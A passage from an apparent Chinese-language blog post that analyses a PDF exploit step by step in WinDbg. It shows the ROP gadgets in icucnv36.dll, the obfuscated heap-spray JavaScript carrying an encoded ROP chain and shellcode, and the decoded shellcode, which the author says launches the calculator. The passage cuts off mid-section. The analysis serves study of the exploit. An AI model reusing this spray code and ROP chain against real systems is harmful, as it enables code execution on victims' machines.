69fd2e39 6d70eb0d b877a4e9 db9a8a4d</span><br><span class="line">0012e54c  883c0409 f6fa0ea5 6634d433 e7f0ef0d</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a80cb3f esp=0012e4e0 ebp=f012512c iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202</span><br><span class="line">icucnv36!ucnv_toUChars_3_6+0x169:</span><br><span class="line">4a80cb3f c3              ret</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a82a714 esp=0012e4e4 ebp=f012512c iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202</span><br><span class="line">icucnv36!icu_3_6::CharacterIterator::setToStart+0x8:</span><br><span class="line">4a82a714 5c              pop     esp</span><br><span class="line">0:000&gt; dd esp L1</span><br><span class="line">0012e4e4  0c0c0c0c</span><br><span class="line">0:000&gt; u 4a82a714 </span><br><span class="line">icucnv36!icu_3_6::CharacterIterator::setToStart+0x8:</span><br><span class="line">4a82a714 5c              pop     esp</span><br><span class="line">4a82a715 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>通过两个 <code>gadget</code> 控制 <code>eip</code> 到了 <code>[0x0c0c0c0c]</code>,剩下就是堆喷射啦。<br>如果用图来表示这个过程的话，大概是下面这样吧。<br>![ffss.png-27.1kB][10]<br><code>emmmmmm</code> 现在已经控制 <code>eip = [0x0c0c0c0c]</code> 啦，剩下的就好多了， 堆喷射完成 <code>shellcode</code> 的布局，然后就是使 <code>eip</code> 滑入放置好的 <code>shllcode</code> 啦，堆喷射的代码可以通过 <code>PdfStreamDumper</code> 得到。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var mqraPQZSAwAwCczJcaACUcIIwCnLbss = unescape;</span><br><span class="line">var twSOePGGglyJWdlzCpRIHpSsaEoDFZmatVqAcDoCSkrLKdpcOIBqGOVtWQMSEAGMpVRA = mqraPQZSAwAwCczJcaACUcIIwCnLbss( &apos;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u64b8%u9c0f%uda97%ud9cc%u2474%u5ef4%uc929%u31b1%uc683%u3104%u0f46%u4603%ued6b%u6b69%u739b%u9491%u145b%u711b%u146a%uf17f%ua4dc%u570b%u4fd0%u4c59%u3d63%u6376%u88c4%u4aa0%ua1d5%ucd91%ub855%u2dc5%u7364%u2f18%u6ea1%u7dd1%ue47a%u9244%ub00f%u1954%u5443%ufedd%u5713%u50cc%u0e28%u53ce%u3afd%u4c47%u07e2%ue711%ufcd0%u21a0%ufc29%u0c0f%u0f86%u4851%uf020%ua024%u8d53%u773e%u492e%u6cca%u1a88%u496c%uce29%u1aeb%ubb25%u4478%u3a29%ufeac%ub755%ud153%u83dc%uf577%u5085%uac19%u3663%uae26%ue7cc%ua482%ufce0%ue6be%u026e%u9d4c%u04dc%u9e4e%u6d70%u157f%uea1f%ufc80%u0464%u5dcb%u8dcc%u3792%ud04d%ue224%ued91%u07a6%u0a69%u6db6%u566c%u9d70%uc71c%ua115%ue8b3%uc23f%u7b52%u2ba3%ufbf1%u3446&apos; );</span><br><span class="line">var NrWJJGMFyDgCbq = mqraPQZSAwAwCczJcaACUcIIwCnLbss( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">while (NrWJJGMFyDgCbq.length + 20 + 8 &lt; 65536) NrWJJGMFyDgCbq+=NrWJJGMFyDgCbq;</span><br><span class="line">BuWToJIZTn = NrWJJGMFyDgCbq.substring(0, (0x0c0c-0x24)/2);</span><br><span class="line">BuWToJIZTn += twSOePGGglyJWdlzCpRIHpSsaEoDFZmatVqAcDoCSkrLKdpcOIBqGOVtWQMSEAGMpVRA;</span><br><span class="line">BuWToJIZTn += NrWJJGMFyDgCbq;</span><br><span class="line">wrIFk = BuWToJIZTn.substring(0, 65536/2);</span><br><span class="line">while(wrIFk.length &lt; 0x80000) wrIFk += wrIFk;</span><br><span class="line">TjCv = wrIFk.substring(0, 0x80000 - (0x1020-0x08) / 2);</span><br><span class="line">var erZHzdqUNRLxpgKzIZXauOqtrPeTBcQpgRKVLwLA = new Array();</span><br><span class="line">for (wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj=0;wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj&lt;0x1f0;wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj++) erZHzdqUNRLxpgKzIZXauOqtrPeTBcQpgRKVLwLA[wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj]=TjCv+&quot;s&quot;;</span><br></pre></td></tr></table></figure></p>
<p>上面的 <code>shellcode</code> 是能还原出来的，不过为了熟悉下调试还是用 <code>windbg</code>吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 0c0c0c0c L20</span><br><span class="line">0c0c0c0c  4a8063a5 4a8a0000 4a802196 4a801f90</span><br><span class="line">0c0c0c1c  4a84903c 4a80b692 4a801064 4a8522c8</span><br><span class="line">0c0c0c2c  10000000 00000000 00000000 00000002</span><br><span class="line">0c0c0c3c  00000102 00000000 4a8063a5 4a801064</span><br><span class="line">0c0c0c4c  4a842db2 4a802ab1 00000008 4a80a8a6</span><br><span class="line">0c0c0c5c  4a801f90 4a849038 4a80b692 4a801064</span><br><span class="line">0c0c0c6c  ffffffff 00000000 00000040 00000000</span><br><span class="line">0c0c0c7c  00010000 00000000 4a8063a5 4a801064</span><br></pre></td></tr></table></figure></p>
<p>我们先来看下堆中这些数据的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a8063a5 </span><br><span class="line">icucnv36!uenum_count_3_6+0x1d:</span><br><span class="line">4a8063a5 59              pop     ecx</span><br><span class="line">4a8063a6 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>执行完成后 <code>ecx = 0x4a8a0000</code>,再来看下 <code>0x4a802196</code> 处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a802196</span><br><span class="line">icucnv36!ubidi_getClassCallback_3_6+0x22:</span><br><span class="line">4a802196 8901            mov     dword ptr [ecx],eax</span><br><span class="line">4a802198 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>执行完后 <code>[0x4a8a0000] = 0x0012e6d0</code>,之后跳到了 <code>0x4a801f90</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a801f90</span><br><span class="line">icucnv36!ubidi_getDirection_3_6+0x18:</span><br><span class="line">4a801f90 58              pop     eax</span><br><span class="line">4a801f91 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>最后 <code>eax =4a84903c</code>,跳到了 <code>0x4a80b692</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a80b692</span><br><span class="line">icucnv36!u_errorName_3_6+0xdf:</span><br><span class="line">4a80b692 ff20            jmp     dword ptr [eax]</span><br></pre></td></tr></table></figure></p>
<p><code>0x4a84903c</code> 实际上是 <code>icucnv36.dll</code> 里函数<code>CreateFileA</code> 在导入表中的地址，所以这样就完成了对<code>CreateFileA</code>函数的调用。<br>函数参数如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 0c0c0c28 L7</span><br><span class="line">0c0c0c28  4a8522c8 10000000 00000000 00000000</span><br><span class="line">0c0c0c38  00000002 00000102 00000000</span><br><span class="line">0:000&gt; da 4a8522c8</span><br><span class="line">4a8522c8  &quot;iso88591&quot;</span><br></pre></td></tr></table></figure></p>
<p>即<code>CreateFileA(0x4a8522c8,GENERIC_ALL,0,NULL,CREATE_ALWAYS,HIDDEN|TEMPORARY,NULL)</code>。<br>之后通过 <code>0x4a801064</code> 处的 <code>ret</code> 指令重新反回到了<code>icucnv36.dll</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eax=00000328 ebx=00000000 ecx=7c93003d edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a801064 esp=0c0c0c44 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36+0x1064:</span><br><span class="line">4a801064 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>然后看下如何再一次控制 <code>eip</code> 去完成我们想做的事情。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; </span><br><span class="line">eax=00000328 ebx=00000000 ecx=7c93003d edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a8063a5 esp=0c0c0c48 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!uenum_count_3_6+0x1d:</span><br><span class="line">4a8063a5 59              pop     ecx</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000328 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a8063a6 esp=0c0c0c4c ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!uenum_count_3_6+0x1e:</span><br><span class="line">4a8063a6 c3              ret</span><br><span class="line">0:000&gt; </span><br><span class="line">eax=00000328 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a842db2 esp=0c0c0c50 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!u_strFromUTF32_3_6+0x142:</span><br><span class="line">4a842db2 97              xchg    eax,edi</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e718 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=00000328</span><br><span class="line">eip=4a842db3 esp=0c0c0c50 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!u_strFromUTF32_3_6+0x143:</span><br><span class="line">4a842db3 c3              ret</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e718 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=00000328</span><br><span class="line">eip=4a802ab1 esp=0c0c0c54 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!ubidi_getDummy_3_6+0xc7:</span><br><span class="line">4a802ab1 5b              pop     ebx</span><br></pre></td></tr></table></figure></p>
<p>实际上下面要执行的 <code>gadget</code> 的作用是重新控制 <code>eip</code> ，和之前的<code>call    dword ptr [eax]</code> 是类似的，使用的 <code>gadget</code> 如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">icucnv36!ubidi_getDummy_3_6+0xc7:</span><br><span class="line">4a802ab1 5b              pop     ebx</span><br><span class="line">4a802ab2 c3              ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">icucnv36!uprv_pathIsAbsolute_3_6+0xd:</span><br><span class="line">4a80a8a6 213c5c          and     dword ptr [esp+ebx*2],edi ss:0023:0c0c0c6c=ffffffff</span><br><span class="line">4a80a8a9 7503            jne     icucnv36!uprv_pathIsAbsolute_3_6+0x15 (4a80a8ae) [br=1]</span><br><span class="line">4a80a8ae 3c2f            cmp     al,2Fh</span><br><span class="line">4a80a8b0 74f9            je      icucnv36!uprv_pathIsAbsolute_3_6+0x12 (4a80a8ab) [br=0]</span><br><span class="line">4a80a8b2 3c41            cmp     al,41h</span><br><span class="line">4a80a8b4 7c04            jl      icucnv36!uprv_pathIsAbsolute_3_6+0x21 (4a80a8ba) [br=1]</span><br><span class="line">4a80a8ba 3c61            cmp     al,61h</span><br><span class="line">4a80a8bc 7c0a            jl      icucnv36!uprv_pathIsAbsolute_3_6+0x2f (4a80a8c8) [br=1]</span><br><span class="line">4a80a8c8 32c0            xor     al,al</span><br><span class="line">4a80a8ca c3              ret</span><br><span class="line"></span><br><span class="line">icucnv36!ubidi_getDirection_3_6+0x18:</span><br><span class="line">4a801f90 58              pop     eax</span><br><span class="line">4a801f91 c3              ret</span><br><span class="line"></span><br><span class="line">icucnv36!u_errorName_3_6+0xdf:</span><br><span class="line">4a80b692 ff20            jmp     dword ptr [eax]      ds:0023:4a849038=&#123;kernel32!CreateFileMappingA (7c8094ee)&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到这次调用了 <code>CreateFileMappingA</code> 函数，之后用相同的方法执行 <code>MapViewOfFile</code> 函数完成一段可执行内存空间的开辟。之后调用 <code>memcpy</code> 函数完成堆上 <code>shellcode</code> 的复制。查看 <code>shellcode</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">029e0000 b8640f9c97      mov     eax,979C0F64h</span><br><span class="line">029e0005 dacc            fcmove  st,st(4)</span><br><span class="line">029e0007 d97424f4        fnstenv [esp-0Ch]</span><br><span class="line">029e000b 5e              pop     esi</span><br><span class="line">029e000c 29c9            sub     ecx,ecx</span><br><span class="line">029e000e b131            mov     cl,31h</span><br><span class="line">029e0010 83c604          add     esi,4</span><br><span class="line">029e0013 31460f          xor     dword ptr [esi+0Fh],eax</span><br><span class="line">029e0016 03460f          add     eax,dword ptr [esi+0Fh]</span><br><span class="line">029e0019 e2f5            loop    029e0010</span><br><span class="line">029e001b fc              cld</span><br><span class="line">029e001c e882000000      call    029e00a3</span><br><span class="line">029e0021 60              pushad</span><br><span class="line">029e0022 89e5            mov     ebp,esp</span><br><span class="line">029e0024 31c0            xor     eax,eax</span><br><span class="line">029e0026 648b5030        mov     edx,dword ptr fs:[eax+30h]</span><br><span class="line">029e002a 8b520c          mov     edx,dword ptr [edx+0Ch]</span><br><span class="line">029e002d 8b5214          mov     edx,dword ptr [edx+14h]</span><br><span class="line">029e0030 8b7228          mov     esi,dword ptr [edx+28h]</span><br><span class="line">029e0033 0fb74a26        movzx   ecx,word ptr [edx+26h]</span><br><span class="line">029e0037 31ff            xor     edi,edi</span><br><span class="line">029e0039 ac              lods    byte ptr [esi]</span><br><span class="line">029e003a 3c61            cmp     al,61h</span><br><span class="line">029e003c 7c02            jl      029e0040</span><br><span class="line">029e003e 2c20            sub     al,20h</span><br><span class="line">029e0040 c1cf0d          ror     edi,0Dh</span><br><span class="line">029e0043 01c7            add     edi,eax</span><br><span class="line">029e0045 e2f2            loop    029e0039</span><br><span class="line">029e0047 52              push    edx</span><br><span class="line">029e0048 57              push    edi</span><br><span class="line">029e0049 8b5210          mov     edx,dword ptr [edx+10h]</span><br><span class="line">029e004c 8b4a3c          mov     ecx,dword ptr [edx+3Ch]</span><br><span class="line">029e004f 8b4c1178        mov     ecx,dword ptr [ecx+edx+78h]</span><br><span class="line">029e0053 e348            jecxz   029e009d</span><br><span class="line">029e0055 01d1            add     ecx,edx</span><br><span class="line">029e0057 51              push    ecx</span><br><span class="line">029e0058 8b5920          mov     ebx,dword ptr [ecx+20h]</span><br><span class="line">029e005b 01d3            add     ebx,edx</span><br><span class="line">029e005d 8b4918          mov     ecx,dword ptr [ecx+18h]</span><br><span class="line">029e0060 e33a            jecxz   029e009c</span><br><span class="line">029e0062 49              dec     ecx</span><br><span class="line">029e0063 8b348b          mov     esi,dword ptr [ebx+ecx*4]</span><br><span class="line">029e0066 01d6            add     esi,edx</span><br><span class="line">029e0068 31ff            xor     edi,edi</span><br><span class="line">029e006a ac              lods    byte ptr [esi]</span><br><span class="line">029e006b c1cf0d          ror     edi,0Dh</span><br><span class="line">029e006e 01c7            add     edi,eax</span><br><span class="line">029e0070 38e0            cmp     al,ah</span><br><span class="line">029e0072 75f6            jne     029e006a</span><br><span class="line">029e0074 037df8          add     edi,dword ptr [ebp-8]</span><br><span class="line">029e0077 3b7d24          cmp     edi,dword ptr [ebp+24h]</span><br><span class="line">029e007a 75e4            jne     029e0060</span><br><span class="line">029e007c 58              pop     eax</span><br><span class="line">029e007d 8b5824          mov     ebx,dword ptr [eax+24h]</span><br><span class="line">029e0080 01d3            add     ebx,edx</span><br><span class="line">029e0082 668b0c4b        mov     cx,word ptr [ebx+ecx*2]</span><br><span class="line">029e0086 8b581c          mov     ebx,dword ptr [eax+1Ch]</span><br><span class="line">029e0089 01d3            add     ebx,edx</span><br><span class="line">029e008b 8b048b          mov     eax,dword ptr [ebx+ecx*4]</span><br><span class="line">029e008e 01d0            add     eax,edx</span><br><span class="line">029e0090 89442424        mov     dword ptr [esp+24h],eax</span><br><span class="line">029e0094 5b              pop     ebx</span><br><span class="line">029e0095 5b              pop     ebx</span><br><span class="line">029e0096 61              popad</span><br><span class="line">029e0097 59              pop     ecx</span><br><span class="line">029e0098 5a              pop     edx</span><br><span class="line">029e0099 51              push    ecx</span><br><span class="line">029e009a ffe0            jmp     eax</span><br><span class="line">029e009c 5f              pop     edi</span><br><span class="line">029e009d 5f              pop     edi</span><br><span class="line">029e009e 5a              pop     edx</span><br><span class="line">029e009f 8b12            mov     edx,dword ptr [edx]</span><br><span class="line">029e00a1 eb8d            jmp     029e0030</span><br><span class="line">029e00a3 5d              pop     ebp</span><br><span class="line">029e00a4 6a01            push    1</span><br><span class="line">029e00a6 8d85b2000000    lea     eax,[ebp+0B2h]</span><br><span class="line">029e00ac 50              push    eax</span><br><span class="line">029e00ad 68318b6f87      push    876F8B31h</span><br><span class="line">029e00b2 ffd5            call    ebp</span><br><span class="line">029e00b4 bbf0b5a256      mov     ebx,56A2B5F0h</span><br><span class="line">029e00b9 68a695bd9d      push    9DBD95A6h</span><br><span class="line">029e00be ffd5            call    ebp</span><br><span class="line">029e00c0 3c06            cmp     al,6</span><br><span class="line">029e00c2 7c0a            jl      029e00ce</span><br><span class="line">029e00c4 80fbe0          cmp     bl,0E0h</span><br><span class="line">029e00c7 7505            jne     029e00ce</span><br><span class="line">029e00c9 bb4713726f      mov     ebx,6F721347h</span><br><span class="line">029e00ce 6a00            push    0</span><br><span class="line">029e00d0 53              push    ebx</span><br><span class="line">029e00d1 ffd5            call    ebp</span><br><span class="line">029e00d3 63616c          arpl    word ptr [ecx+6Ch],sp</span><br><span class="line">029e00d6 632e            arpl    word ptr [esi],bp</span><br><span class="line">029e00d8 657865          js      029e0140</span><br><span class="line">029e00db 000c0c          add     byte ptr [esp+ecx],cl</span><br></pre></td></tr></table></figure></p>
<p>一个被变形过的 <code>shellcode</code>,很难看出来功能，在<code>kernel32!WinExec</code>处下断点可以发现功能是弹出计算器。可能是我太菜了，算了，就这样吧。</p>
<h2 id="exploit分析"><a href="#exploit分析" class="headerlink" title="exploit分析"></a>exploit分析</h2><p>先贴一下主要的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span 